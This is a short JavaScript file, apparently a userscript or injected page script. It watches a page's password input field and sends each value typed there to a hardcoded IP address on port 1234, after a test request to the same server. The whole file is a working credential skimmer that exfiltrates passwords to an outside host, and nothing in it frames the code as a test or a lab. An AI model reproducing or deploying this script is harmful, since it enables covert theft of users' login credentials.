
const url1 = 'http://106.12.9.249:1234/xjp';
const url2 = 'http://106.12.9.249:1234/yh-test1';
const url3 = 'http://106.12.9.249:1234/yh-get-input';


console.log('脚本准备请求:',url2);
console.log('YHUtils',YHUtils)

YHUtils.request_yh({
  url: url2,
  method: 'get',
  timeout: 3000
}).then(r => {
  console.log('r',r.responseText)
}).catch(err => {
  console.log('err',err)
})





class WatchInput {
  constructor({ selector,url }) {
    this.url = url
    this.inputEl = document.querySelector(selector)
    if (!this.inputEl) throw new Error('input element not found')
    this.watch()
  }
  watch() {
    this.inputEl.addEventListener('change',(event) => {
      const value = event.target.value;
      console.log(`Input value changed: ${value}`);
      this.sendValue(value)
    });
  }

  sendValue(value) {
    console.log(`Sending value: ${value}`);
    // Here you can implement the logic to send the value to a server or perform any other action.
    YHUtils.request_yh({
      url: this.url,
      method: 'post',
      data: { value }
    }).then(r => {
      console.log('Value sent successfully:',r.responseText);
    })
  }
}
console.log('WatchInput 创建实例');
new WatchInput({ selector: '#password',url: url3 })